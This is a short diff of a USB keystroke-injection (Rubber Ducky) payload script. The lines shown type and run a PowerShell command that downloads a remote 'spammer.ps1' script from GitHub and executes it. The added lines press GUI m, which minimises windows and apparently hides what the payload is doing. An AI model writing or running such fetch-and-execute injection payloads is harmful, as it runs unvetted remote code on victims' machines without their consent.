@@ -16,3 +16,5 @@ DELAY 500
 STRING Invoke-Expression (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/theatmcg/rubber-ducky/main/spammer/spammer.ps1").Content
 DELAY 200
 ENTER
+DELAY 500
+GUI m
